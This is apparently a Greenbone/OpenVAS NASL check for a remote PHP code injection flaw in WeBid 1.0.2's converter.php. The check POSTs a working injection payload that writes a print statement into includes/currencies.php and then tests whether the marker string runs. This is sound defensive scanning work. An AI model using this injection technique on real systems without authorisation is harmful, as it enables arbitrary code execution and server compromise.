CPE = "cpe:/a:webidsupport:webid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103186" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-07-06 13:49:20 +0200 (Wed, 06 Jul 2011)" );
	script_bugtraq_id( 48554 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WeBid 'converter.php' Multiple Remote PHP Code Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48554" );
	script_xref( name: "URL", value: "http://www.webidsupport.com/forums/showthread.php?3892" );
	script_xref( name: "URL", value: "http://www.webidsupport.com" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_webid_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "webid/installed" );
	script_tag( name: "summary", value: "WeBid is prone to multiple vulnerabilities that attackers can leverage
  to execute arbitrary PHP code because the application fails to
  adequately sanitize user-supplied input." );
	script_tag( name: "impact", value: "Successful attacks can compromise the affected application and
  possibly the underlying system." );
	script_tag( name: "affected", value: "WeBid 1.0.2 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = NASLString( dir, "/converter.php" );
host = http_host_name( port: port );
postdata = NASLString( "action=convert&from=USD&to=%00%27%29%29%3Bprint%28%27vt-c-i-test%27%2F%2F" );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
url = NASLString( dir, "/includes/currencies.php" );
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "vt-c-i-test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

